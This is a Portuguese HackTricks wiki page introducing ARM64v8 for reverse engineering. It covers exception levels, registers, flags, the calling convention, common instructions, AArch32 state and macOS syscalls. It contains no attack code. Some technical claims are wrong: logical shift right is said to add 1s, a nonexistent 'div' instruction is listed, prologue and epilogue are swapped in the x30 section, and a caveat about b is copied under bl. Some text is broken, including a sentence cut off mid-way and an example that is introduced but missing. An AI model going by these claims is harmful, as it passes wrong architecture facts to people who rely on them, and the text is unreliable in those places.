# Introdução ao ARM64v8

{% hint style="success" %}
Aprenda e pratique Hacking na AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## **Níveis de Exceção - EL (ARM64v8)**

Na arquitetura ARMv8, os níveis de execução, conhecidos como Níveis de Exceção (ELs), definem o nível de privilégio e as capacidades do ambiente de execução. Existem quatro níveis de exceção, variando de EL0 a EL3, cada um servindo a um propósito diferente:

1. **EL0 - Modo Usuário**:
* Este é o nível com menos privilégios e é usado para executar código de aplicativos regulares.
* Aplicativos em execução em EL0 são isolados uns dos outros e do software do sistema, aumentando a segurança e estabilidade.
2. **EL1 - Modo Kernel do Sistema Operacional**:
* A maioria dos kernels de sistemas operacionais é executada neste nível.
* EL1 tem mais privilégios que EL0 e pode acessar recursos do sistema, mas com algumas restrições para garantir a integridade do sistema.
3. **EL2 - Modo Hypervisor**:
* Este nível é usado para virtualização. Um hipervisor em execução em EL2 pode gerenciar vários sistemas operacionais (cada um em seu próprio EL1) em um mesmo hardware físico.
* EL2 fornece recursos para isolamento e controle dos ambientes virtualizados.
4. **EL3 - Modo Monitor Seguro**:
* Este é o nível mais privilegiado e é frequentemente usado para inicialização segura e ambientes de execução confiáveis.
* EL3 pode gerenciar e controlar acessos entre estados seguros e não seguros (como inicialização segura, SO confiável, etc.).

O uso desses níveis permite gerenciar de forma estruturada e segura diferentes aspectos do sistema, desde aplicativos de usuário até o software do sistema mais privilegiado. A abordagem da ARMv8 em relação aos níveis de privilégio ajuda a isolar efetivamente diferentes componentes do sistema, aumentando assim a segurança e robustez do sistema.

## **Registradores (ARM64v8)**

ARM64 possui **31 registradores de propósito geral**, rotulados de `x0` a `x30`. Cada um pode armazenar um valor de **64 bits** (8 bytes). Para operações que requerem apenas valores de 32 bits, os mesmos registradores podem ser acessados em modo de 32 bits usando os nomes w0 a w30.

1. **`x0`** a **`x7`** - Geralmente são usados como registradores temporários e para passar parâmetros para sub-rotinas.
* **`x0`** também carrega os dados de retorno de uma função.
2. **`x8`** - No kernel do Linux, `x8` é usado como o número da chamada de sistema para a instrução `svc`. **No macOS, o x16 é o utilizado!**
3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
4. **`x16`** e **`x17`** - **Registradores de Chamada Intra-procedural**. Registradores temporários para valores imediatos. Também são usados para chamadas de função indiretas e stubs PLT (Procedure Linkage Table).
* **`x16`** é usado como o **número da chamada de sistema** para a instrução **`svc`** no **macOS**.
5. **`x18`** - **Registrador de Plataforma**. Pode ser usado como um registrador de propósito geral, mas em algumas plataformas, este registrador é reservado para usos específicos da plataforma: Ponteiro para bloco de ambiente de thread atual no Windows, ou para apontar para a estrutura de tarefa atualmente **em execução no kernel do Linux**.
6. **`x19`** a **`x28`** - Estes são registradores salvos pelo chamador. Uma função deve preservar os valores desses registradores para seu chamador, então eles são armazenados na pilha e recuperados antes de retornar ao chamador.
7. **`x29`** - **Ponteiro de Frame** para acompanhar o quadro da pilha. Quando um novo quadro de pilha é criado porque uma função é chamada, o registro **`x29`** é **armazenado na pilha** e o endereço do **novo** ponteiro de quadro (endereço **`sp`**) é **armazenado neste registro**.
* Este registro também pode ser usado como um **registro de propósito geral**, embora seja geralmente usado como referência para **variáveis locais**.
8. **`x30`** ou **`lr`** - **Registrador de Link**. Ele mantém o **endereço de retorno** quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada armazenando o valor de **`pc`** neste registro.
* Também pode ser usado como qualquer outro registro.
* Se a função atual for chamar uma nova função e, portanto, sobrescrever `lr`, ela o armazenará na pilha no início, este é o epílogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Armazenar `fp` e `lr`, gerar espaço e obter novo `fp`) e recuperá-lo no final, este é o prólogo (`ldp x29, x30, [sp], #48; ret` -> Recuperar `fp` e `lr` e retornar).
9. **`sp`** - **Ponteiro de Pilha**, usado para acompanhar o topo da pilha.
* o valor de **`sp`** deve sempre ser mantido pelo menos em um **alinhamento de quadword** ou uma exceção de alinhamento pode ocorrer.
10. **`pc`** - **Contador de Programa**, que aponta para a próxima instrução. Este registro só pode ser atualizado por meio de gerações de exceção, retornos de exceção e branches. As únicas instruções comuns que podem ler este registro são instruções de branch com link (BL, BLR) para armazenar o endereço de **`pc`** em **`lr`** (Registrador de Link).
11. **`xzr`** - **Registrador Zero**. Também chamado de **`wzr`** em sua forma de registro de **32** bits. Pode ser usado para obter facilmente o valor zero (operação comum) ou para realizar comparações usando **`subs`** como **`subs XZR, Xn, #10`** armazenando os dados resultantes em lugar nenhum (em **`xzr`**).

Os registradores **`Wn`** são a versão de **32 bits** do registrador **`Xn`**.

### Registradores SIMD e de Ponto Flutuante

Além disso, existem outros **32 registradores de comprimento de 128 bits** que podem ser usados em operações otimizadas de dados múltiplos de instrução única (SIMD) e para realizar aritmética de ponto flutuante. Eles são chamados de registradores Vn, embora também possam operar em **64** bits, **32** bits, **16** bits e **8** bits e então são chamados de **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.
### Registros do Sistema

**Existem centenas de registros do sistema**, também chamados de registros de propósito especial (SPRs), que são usados para **monitorar** e **controlar** o **comportamento dos processadores**.\
Eles só podem ser lidos ou definidos usando as instruções especiais dedicadas **`mrs`** e **`msr`**.

Os registros especiais **`TPIDR_EL0`** e **`TPIDDR_EL0`** são comumente encontrados ao reverter engenharia. O sufixo `EL0` indica a **exceção mínima** da qual o registro pode ser acessado (neste caso, EL0 é a exceção regular (privilégio) nível que programas regulares são executados).\
Eles são frequentemente usados para armazenar o **endereço base da região de armazenamento local de thread** na memória. Geralmente, o primeiro é legível e gravável para programas em execução em EL0, mas o segundo pode ser lido em EL0 e gravado em EL1 (como kernel).

* `mrs x0, TPIDR_EL0 ; Ler TPIDR_EL0 em x0`
* `msr TPIDR_EL0, X0 ; Escrever x0 em TPIDR_EL0`

### **PSTATE**

**PSTATE** contém vários componentes de processo serializados no registro especial **`SPSR_ELx`** visível para o sistema operacional, sendo X o **nível de permissão da exceção acionada** (isso permite recuperar o estado do processo quando a exceção termina).\
Estes são os campos acessíveis:

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

* As flags de condição **`N`**, **`Z`**, **`C`** e **`V`**:
* **`N`** significa que a operação resultou em um número negativo
* **`Z`** significa que a operação resultou em zero
* **`C`** significa que a operação foi realizada
* **`V`** significa que a operação resultou em um estouro assinado:
* A soma de dois números positivos resulta em um número negativo.
* A soma de dois números negativos resulta em um número positivo.
* Na subtração, quando um número negativo grande é subtraído de um número positivo menor (ou vice-versa), e o resultado não pode ser representado dentro da faixa do tamanho de bits fornecido.
* Obviamente, o processador não sabe se a operação é assinada ou não, então ele verificará C e V nas operações e indicará se ocorreu uma transferência de transporte no caso de ser assinada ou não assinada.

{% hint style="warning" %}
Nem todas as instruções atualizam essas flags. Algumas como **`CMP`** ou **`TST`** fazem, e outras que têm um sufixo s como **`ADDS`** também o fazem.
{% endhint %}

* A flag de **largura de registro atual (`nRW`)**: Se a flag tiver o valor 0, o programa será executado no estado de execução AArch64 quando retomado.
* O **Nível de Exceção Atual** (**`EL`**): Um programa regular em execução em EL0 terá o valor 0
* A flag de **passo único** (**`SS`**): Usada por depuradores para passo único definindo a flag SS como 1 dentro de **`SPSR_ELx`** por meio de uma exceção. O programa executará um passo e emitirá uma exceção de passo único.
* A flag de estado de exceção ilegal (**`IL`**): É usada para marcar quando um software privilegiado executa uma transferência de nível de exceção inválida, essa flag é definida como 1 e o processador aciona uma exceção de estado ilegal.
* As flags **`DAIF`**: Essas flags permitem que um programa privilegiado mascare seletivamente certas exceções externas.
* Se **`A`** for 1, significa que os **abortos assíncronos** serão acionados. O **`I`** configura para responder a **Solicitações de Interrupção de Hardware** externas (IRQs). e o F está relacionado a **Solicitações de Interrupção Rápida** (FIRs).
* As flags de seleção de ponteiro de pilha (**`SPS`**): Programas privilegiados em execução em EL1 e acima podem alternar entre o uso de seu próprio registro de ponteiro de pilha e o do modelo de usuário (por exemplo, entre `SP_EL1` e `EL0`). Essa troca é realizada escrevendo no registro especial **`SPSel`**. Isso não pode ser feito a partir de EL0.

## **Convenção de Chamada (ARM64v8)**

A convenção de chamada ARM64 especifica que os **primeiros oito parâmetros** de uma função são passados nos registros **`x0` a `x7`**. **Parâmetros adicionais** são passados na **pilha**. O valor de **retorno** é passado de volta no registro **`x0`**, ou também em **`x1`** se tiver 128 bits de comprimento. Os registros **`x19`** a **`x30`** e **`sp`** devem ser **preservados** em chamadas de função.

Ao ler uma função em assembly, procure o **prólogo e epílogo** da função. O **prólogo** geralmente envolve **salvar o ponteiro de quadro (`x29`)**, **configurar** um **novo ponteiro de quadro** e **alocar espaço na pilha**. O **epílogo** geralmente envolve **restaurar o ponteiro de quadro salvo** e **retornar** da função.

### Convenção de Chamada em Swift

Swift tem sua própria **convenção de chamada** que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instruções Comuns (ARM64v8)**

As instruções ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser realizada (como `add`, `sub`, `mov`, etc.), **`dst`** é o **registro de destino** onde o resultado será armazenado, e **`src1`** e **`src2`** são os **registros de origem**. Valores imediatos também podem ser usados no lugar de registros de origem.

* **`mov`**: **Mover** um valor de um **registro** para outro.
* Exemplo: `mov x0, x1` — Isso move o valor de `x1` para `x0`.
* **`ldr`**: **Carregar** um valor da **memória** para um **registro**.
* Exemplo: `ldr x0, [x1]` — Isso carrega um valor da localização de memória apontada por `x1` em `x0`.
* **Modo de deslocamento**: Um deslocamento que afeta o ponteiro de origem é indicado, por exemplo:
* `ldr x2, [x1, #8]`, isso carregará em x2 o valor de x1 + 8
* `ldr x2, [x0, x1, lsl #2]`, isso carregará em x2 um objeto da matriz x0, da posição x1 (índice) \* 4
* **Modo pré-indexado**: Isso aplicará cálculos à origem, obterá o resultado e também armazenará a nova origem na origem.
* `ldr x2, [x1, #8]!`, isso carregará `x1 + 8` em `x2` e armazenará em x1 o resultado de `x1 + 8`
* `str lr, [sp, #-4]!`, Armazene o registro de link em sp e atualize o registro sp
* **Modo pós-indexado**: É como o anterior, mas o endereço de memória é acessado e então o deslocamento é calculado e armazenado.
* `ldr x0, [x1], #8`, carrega `x1` em `x0` e atualiza x1 com `x1 + 8`
* **Endereçamento relativo ao PC**: Neste caso, o endereço a ser carregado é calculado em relação ao registro PC
* `ldr x1, =_start`, Isso carregará o endereço onde o símbolo `_start` começa em x1 em relação ao PC atual.
* **`str`**: **Armazenar** um valor de um **registro** na **memória**.
* Exemplo: `str x0, [x1]` — Isso armazena o valor em `x0` na localização de memória apontada por `x1`.
* **`ldp`**: **Carregar Par de Registros**. Esta instrução **carrega dois registros** de **locais de memória consecutivos**. O endereço de memória é tipicamente formado adicionando um deslocamento ao valor em outro registro.
* Exemplo: `ldp x0, x1, [x2]` — Isso carrega `x0` e `x1` nos locais de memória em `x2` e `x2 + 8`, respectivamente.
* **`stp`**: **Armazenar Par de Registros**. Esta instrução **armazena dois registros** em **locais de memória consecutivos**. O endereço de memória é tipicamente formado adicionando um deslocamento ao valor em outro registro.
* Exemplo: `stp x0, x1, [sp]` — Isso armazena `x0` e `x1` nos locais de memória em `sp` e `sp + 8`, respectivamente.
* `stp x0, x1, [sp, #16]!` — Isso armazena `x0` e `x1` nos locais de memória em `sp+16` e `sp + 24`, respectivamente, e atualiza `sp` com `sp+16`.
* **`add`**: **Adicionar** os valores de dois registros e armazenar o resultado em um registro.
* Sintaxe: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> Destino
* Xn2 -> Operando 1
* Xn3 | #imm -> Operando 2 (registrador ou imediato)
* \[shift #N | RRX] -> Realiza um deslocamento ou chama RRX
* Exemplo: `add x0, x1, x2` — Isso adiciona os valores em `x1` e `x2` juntos e armazena o resultado em `x0`.
* `add x5, x5, #1, lsl #12` — Isso é igual a 4096 (um 1 deslocado 12 vezes) -> 1 0000 0000 0000 0000
* **`adds`** Isso realiza um `add` e atualiza as flags
* **`sub`**: **Subtrai** os valores de dois registradores e armazena o resultado em um registrador.
* Verifique a **sintaxe do `add`**.
* Exemplo: `sub x0, x1, x2` — Isso subtrai o valor em `x2` de `x1` e armazena o resultado em `x0`.
* **`subs`** Isso é como sub, mas atualizando a flag
* **`mul`**: **Multiplica** os valores de **dois registradores** e armazena o resultado em um registrador.
* Exemplo: `mul x0, x1, x2` — Isso multiplica os valores em `x1` e `x2` e armazena o resultado em `x0`.
* **`div`**: **Divide** o valor de um registrador por outro e armazena o resultado em um registrador.
* Exemplo: `div x0, x1, x2` — Isso divide o valor em `x1` por `x2` e armazena o resultado em `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Deslocamento lógico à esquerda**: Adiciona 0s do final movendo os outros bits para frente (multiplica n vezes por 2)
* **Deslocamento lógico à direita**: Adiciona 1s no início movendo os outros bits para trás (divide n vezes por 2 em não assinado)
* **Deslocamento aritmético à direita**: Como **`lsr`**, mas em vez de adicionar 0s se o bit mais significativo for 1, \*\*1s são adicionados (\*\*divide por n vezes 2 em assinado)
* **Rotação à direita**: Como **`lsr`**, mas o que for removido da direita é anexado à esquerda
* **Rotação à direita com Extensão**: Como **`ror`**, mas com a flag de carry como o "bit mais significativo". Assim, a flag de carry é movida para o bit 31 e o bit removido para a flag de carry.
* **`bfm`**: **Movimento de Campo de Bits**, essas operações **copiam bits `0...n`** de um valor e os colocam em posições **`m..m+n`**. O **`#s`** especifica a posição do **bit mais à esquerda** e o **`#r`** a **quantidade de rotação à direita**.
* Movimento de campo de bits: `BFM Xd, Xn, #r`
* Movimento de campo de bits assinado: `SBFM Xd, Xn, #r, #s`
* Movimento de campo de bits não assinado: `UBFM Xd, Xn, #r, #s`
* **Extrair e Inserir Campo de Bits:** Copia um campo de bits de um registrador e o copia para outro registrador.
* **`BFI X1, X2, #3, #4`** Insere 4 bits de X2 a partir do 3º bit de X1
* **`BFXIL X1, X2, #3, #4`** Extrai do 3º bit de X2 quatro bits e os copia para X1
* **`SBFIZ X1, X2, #3, #4`** Estende o sinal de 4 bits de X2 e os insere em X1 a partir da posição do bit 3, zerando os bits à direita
* **`SBFX X1, X2, #3, #4`** Extrai 4 bits a partir do bit 3 de X2, estende o sinal deles e coloca o resultado em X1
* **`UBFIZ X1, X2, #3, #4`** Estende com zeros 4 bits de X2 e os insere em X1 a partir da posição do bit 3, zerando os bits à direita
* **`UBFX X1, X2, #3, #4`** Extrai 4 bits a partir do bit 3 de X2 e coloca o resultado estendido com zeros em X1.
* **Estender Sinal Para X:** Estende o sinal (ou adiciona apenas 0s na versão não assinada) de um valor para poder realizar operações com ele:
* **`SXTB X1, W2`** Estende o sinal de um byte **de W2 para X1** (`W2` é metade de `X2`) para preencher os 64 bits
* **`SXTH X1, W2`** Estende o sinal de um número de 16 bits **de W2 para X1** para preencher os 64 bits
* **`SXTW X1, W2`** Estende o sinal de um byte **de W2 para X1** para preencher os 64 bits
* **`UXTB X1, W2`** Adiciona 0s (não assinado) a um byte **de W2 para X1** para preencher os 64 bits
* **`extr`:** Extrai bits de um **par de registradores concatenados** especificados.
* Exemplo: `EXTR W3, W2, W1, #3` Isso **concatena W1+W2** e pega **do bit 3 de W2 até o bit 3 de W1** e armazena em W3.
* **`cmp`**: **Compara** dois registradores e define as flags de condição. É um **sinônimo de `subs`** definindo o registrador de destino como o registrador zero. Útil para saber se `m == n`.
* Suporta a **mesma sintaxe que `subs`**
* Exemplo: `cmp x0, x1` — Isso compara os valores em `x0` e `x1` e define as flags de condição adequadamente.
* **`cmn`**: **Compara negativo** o operando. Neste caso, é um **sinônimo de `adds`** e suporta a mesma sintaxe. Útil para saber se `m == -n`.
* **`ccmp`**: Comparação condicional, é uma comparação que será realizada apenas se uma comparação anterior for verdadeira e definirá especificamente os bits nzcv.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, pule para func
* Isso ocorre porque **`ccmp`** será executado apenas se o **`cmp` anterior for um `NE`**, se não, os bits `nzcv` serão definidos como 0 (o que não satisfará a comparação `blt`).
* Isso também pode ser usado como `ccmn` (mesmo, mas negativo, como `cmp` vs `cmn`).
* **`tst`**: Verifica se algum dos valores da comparação são ambos 1 (funciona como um ANDS sem armazenar o resultado em nenhum lugar). É útil para verificar um registro com um valor e verificar se algum dos bits do registro indicado no valor é 1.
* Exemplo: `tst X1, #7` Verifica se algum dos últimos 3 bits de X1 é 1
* **`teq`**: Operação XOR descartando o resultado
* **`b`**: Ramificação incondicional
* Exemplo: `b minhaFuncao`
* Note que isso não preencherá o registrador de link com o endereço de retorno (não adequado para chamadas de sub-rotina que precisam retornar)
* **`bl`**: **Ramificação** com link, usada para **chamar** uma **sub-rotina**. Armazena o **endereço de retorno em `x30`**.
* Exemplo: `bl minhaFuncao` — Isso chama a função `minhaFuncao` e armazena o endereço de retorno em `x30`.
* Note que isso não preencherá o registrador de link com o endereço de retorno (não adequado para chamadas de sub-rotina que precisam retornar)
* **`blr`**: **Ramificação** com Link para Registrador, usada para **chamar** uma **sub-rotina** onde o destino é **especificado** em um **registrador**. Armazena o endereço de retorno em `x30`. (Este é
* Exemplo: `blr x1` — Isso chama a função cujo endereço está contido em `x1` e armazena o endereço de retorno em `x30`.
* **`ret`**: **Retorno** da **sub-rotina**, normalmente usando o endereço em **`x30`**.
* Exemplo: `ret` — Isso retorna da sub-rotina atual usando o endereço de retorno em `x30`.
* **`b.<cond>`**: Ramificações condicionais
* **`b.eq`**: **Ramifica se igual**, com base na instrução `cmp` anterior.
* Exemplo: `b.eq label` — Se a instrução `cmp` anterior encontrou dois valores iguais, isso salta para `label`.
* **`b.ne`**: **Branch if Not Equal**. Esta instrução verifica as flags de condição (que foram definidas por uma instrução de comparação anterior) e, se os valores comparados não forem iguais, faz um salto para um rótulo ou endereço.
* Exemplo: Após uma instrução `cmp x0, x1`, `b.ne label` — Se os valores em `x0` e `x1` não forem iguais, isso salta para `label`.
* **`cbz`**: **Comparar e Salto se Zero**. Esta instrução compara um registro com zero e, se forem iguais, faz um salto para um rótulo ou endereço.
* Exemplo: `cbz x0, label` — Se o valor em `x0` for zero, isso salta para `label`.
* **`cbnz`**: **Comparar e Salto se Não Zero**. Esta instrução compara um registro com zero e, se não forem iguais, faz um salto para um rótulo ou endereço.
* Exemplo: `cbnz x0, label` — Se o valor em `x0` for diferente de zero, isso salta para `label`.
* **`tbnz`**: Testar bit e saltar se não for zero
* Exemplo: `tbnz x0, #8, label`
* **`tbz`**: Testar bit e saltar se for zero
* Exemplo: `tbz x0, #8, label`
* **Operações de seleção condicional**: São operações cujo comportamento varia dependendo dos bits condicionais.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Se verdadeiro, X0 = X1, se falso, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Se verdadeiro, Xd = Xn + 1, se falso, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = NÃO(Xm)
* `cinv Xd, Xn, cond` -> Se verdadeiro, Xd = NÃO(Xn), se falso, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = - Xm
* `cneg Xd, Xn, cond` -> Se verdadeiro, Xd = - Xn, se falso, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = 1, se falso, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = \<todos 1>, se falso, Xd = 0
* **`adrp`**: Calcular o **endereço da página de um símbolo** e armazená-lo em um registro.
* Exemplo: `adrp x0, symbol` — Isso calcula o endereço da página do `símbolo` e armazena em `x0`.
* **`ldrsw`**: **Carregar** um valor **32 bits** assinado da memória e **estendê-lo para 64** bits.
* Exemplo: `ldrsw x0, [x1]` — Isso carrega um valor assinado de 32 bits da localização de memória apontada por `x1`, estende para 64 bits e armazena em `x0`.
* **`stur`**: **Armazenar um valor de registro em uma localização de memória**, usando um deslocamento de outro registro.
* Exemplo: `stur x0, [x1, #4]` — Isso armazena o valor em `x0` na localização de memória que está 4 bytes à frente do endereço atual em `x1`.
* **`svc`** : Fazer uma **chamada de sistema**. Significa "Chamada de Supervisor". Quando o processador executa esta instrução, ele **muda do modo usuário para o modo kernel** e salta para uma localização específica na memória onde o código de **manipulação de chamada de sistema do kernel** está localizado.
*   Exemplo:

```armasm
mov x8, 93  ; Carregar o número da chamada de sistema para saída (93) no registro x8.
mov x0, 0   ; Carregar o código de status de saída (0) no registro x0.
svc 0       ; Fazer a chamada de sistema.
```

### **Prólogo da Função**

1. **Salvar o registro de link e o ponteiro de quadro na pilha**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Configurar o novo ponteiro de quadro**: `mov x29, sp` (configura o novo ponteiro de quadro para a função atual)
3. **Alocar espaço na pilha para variáveis locais** (se necessário): `sub sp, sp, <size>` (onde `<size>` é o número de bytes necessário)

### **Epílogo da Função**

1. **Desalocar variáveis locais (se alguma foi alocada)**: `add sp, sp, <size>`
2. **Restaurar o registro de link e o ponteiro de quadro**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Retorno**: `ret` (retorna o controle para o chamador usando o endereço no registrador de link)

## Estado de Execução AARCH32

Armv8-A suporta a execução de programas de 32 bits. **AArch32** pode ser executado em um dos **dois conjuntos de instruções**: **`A32`** e **`T32`** e pode alternar entre eles via **`interworking`**.\
Programas **privilegiados** de 64 bits podem agendar a **execução de programas de 32 bits** executando uma transferência de nível de exceção para o 32 bits de menor privilégio.\
Observe que a transição de 64 bits para 32 bits ocorre com uma redução do nível de exceção (por exemplo, um programa de 64 bits em EL1 acionando um programa em EL0). Isso é feito configurando o **bit 4 do** registro especial **`SPSR_ELx`** **para 1** quando o processo de thread `AArch32` está pronto para ser executado e o restante de `SPSR_ELx` armazena os programas **`AArch32`** CPSR. Em seguida, o processo privilegiado chama a instrução **`ERET`** para que o processador faça a transição para **`AArch32`** entrando em A32 ou T32 dependendo do CPSR\*\*.\*\*

O **`interworking`** ocorre usando os bits J e T do CPSR. `J=0` e `T=0` significa **`A32`** e `J=0` e `T=1` significa **T32**. Isso basicamente se traduz em configurar o **bit mais baixo para 1** para indicar que o conjunto de instruções é T32.\
Isso é configurado durante as **instruções de ramificação de interworking**, mas também pode ser configurado diretamente com outras instruções quando o PC é definido como o registro de destino. Exemplo:

Outro exemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registros

Existem 16 registradores de 32 bits (r0-r15). **De r0 a r14** eles podem ser usados para **qualquer operação**, no entanto alguns deles geralmente são reservados:

- **`r15`**: Contador de programa (sempre). Contém o endereço da próxima instrução. No A32 atual + 8, no T32, atual + 4.
- **`r11`**: Ponteiro de quadro
- **`r12`**: Registrador de chamada intra-procedural
- **`r13`**: Ponteiro de pilha
- **`r14`**: Registrador de link

Além disso, os registradores são salvos em **registros bancários**. Que são locais que armazenam os valores dos registradores permitindo realizar **trocas de contexto rápidas** no tratamento de exceções e operações privilegiadas para evitar a necessidade de salvar e restaurar manualmente os registradores toda vez.\
Isso é feito salvando o estado do processador do **`CPSR` para o `SPSR`** do modo do processador para o qual a exceção é tomada. No retorno da exceção, o **`CPSR`** é restaurado do **`SPSR`**.

### CPSR - Registro de Status do Programa Atual

No AArch32, o CPSR funciona de forma semelhante ao **`PSTATE`** no AArch64 e também é armazenado em **`SPSR_ELx`** quando uma exceção é tomada para restaurar posteriormente a execução:

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

Os campos são divididos em alguns grupos:

- Registro de Status do Programa de Aplicação (APSR): Flags aritméticas e acessíveis a partir do EL0
- Registros de Estado de Execução: Comportamento do processo (gerenciado pelo SO).

#### Registro de Status do Programa de Aplicação (APSR)

- As flags **`N`**, **`Z`**, **`C`**, **`V`** (assim como no AArch64)
- A flag **`Q`**: É definida como 1 sempre que ocorre **saturação de inteiro** durante a execução de uma instrução aritmética de saturação especializada. Uma vez definida como **`1`**, ela manterá o valor até ser definida manualmente como 0. Além disso, não há nenhuma instrução que verifique seu valor implicitamente, deve ser feito lendo-o manualmente.
-   Flags **`GE`** (Maior ou igual): É usada em operações SIMD (Single Instruction, Multiple Data), como "adição paralela" e "subtração paralela". Essas operações permitem processar vários pontos de dados em uma única instrução.

Por exemplo, a instrução **`UADD8`** **adiciona quatro pares de bytes** (de dois operandos de 32 bits) em paralelo e armazena os resultados em um registrador de 32 bits. Em seguida, **define as flags `GE` no `APSR`** com base nesses resultados. Cada flag GE corresponde a uma das adições de bytes, indicando se a adição para esse par de bytes **transbordou**.

A instrução **`SEL`** usa essas flags GE para realizar ações condicionais.

#### Registros de Estado de Execução

- Os bits **`J`** e **`T`**: **`J`** deve ser 0 e se **`T`** for 0, o conjunto de instruções A32 é usado, e se for 1, o T32 é usado.
- Registro de Estado de Bloco IT (`ITSTATE`): São os bits de 10 a 15 e 25 a 26. Eles armazenam condições para instruções dentro de um grupo prefixado por **`IT`**.
- Bit **`E`**: Indica a **ordem dos bytes**.
- Bits de Máscara de Modo e Exceção (0-4): Eles determinam o estado de execução atual. O quinto indica se o programa é executado como 32 bits (um 1) ou 64 bits (um 0). Os outros 4 representam o **modo de exceção atualmente em uso** (quando ocorre uma exceção e está sendo tratada). O conjunto de números indica a **prioridade atual** no caso de outra exceção ser acionada enquanto esta está sendo tratada.

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Certas exceções podem ser desativadas usando os bits **`A`**, `I`, `F`. Se **`A`** for 1, significa que **abortos assíncronos** serão acionados. O **`I`** configura para responder a **Solicitações de Interrupção de Hardware** externas (IRQs). e o F está relacionado a **Solicitações de Interrupção Rápida** (FIRs).

## macOS

### Chamadas de sistema BSD

Confira [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). As chamadas de sistema BSD terão **x16 > 0**.

### Armadilhas Mach

Confira em [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) a `mach_trap_table` e em [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) os protótipos. O número máximo de armadilhas Mach é `MACH_TRAP_TABLE_COUNT` = 128. As armadilhas Mach terão **x16 < 0**, então você precisa chamar os números da lista anterior com um **sinal de menos**: **`_kernelrpc_mach_vm_allocate_trap`** é **`-10`**.

Você também pode verificar **`libsystem_kernel.dylib`** em um desmontador para descobrir como chamar essas chamadas de sistema (e BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

{% hint style="success" %}
Às vezes é mais fácil verificar o código **descompilado** de **`libsystem_kernel.dylib`** do que verificar o **código-fonte** porque o código de várias chamadas de sistema (BSD e Mach) é gerado por scripts (verifique os comentários no código-fonte) enquanto na dylib você pode encontrar o que está sendo chamado.
{% endhint %}

### chamadas machdep

O XNU suporta outro tipo de chamadas chamadas dependentes da máquina. O número dessas chamadas depende da arquitetura e nem as chamadas nem os números são garantidos de permanecerem constantes.

### página comm

Esta é uma página de memória do proprietário do kernel que é mapeada no espaço de endereço de todos os processos de usuários. Destina-se a tornar a transição do modo de usuário para o espaço do kernel mais rápida do que usar chamadas de sistema para serviços do kernel que são usados com tanta frequência que essa transição seria muito ineficiente.

Por exemplo, a chamada `gettimeofdate` lê o valor de `timeval` diretamente da página comm.

### objc\_msgSend

É super comum encontrar esta função usada em programas Objective-C ou Swift. Esta função permite chamar um método de um objeto Objective-C.

Parâmetros ([mais informações na documentação](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Ponteiro para a instância
* x1: op -> Seletor do método
* x2... -> Restante dos argumentos do método invocado

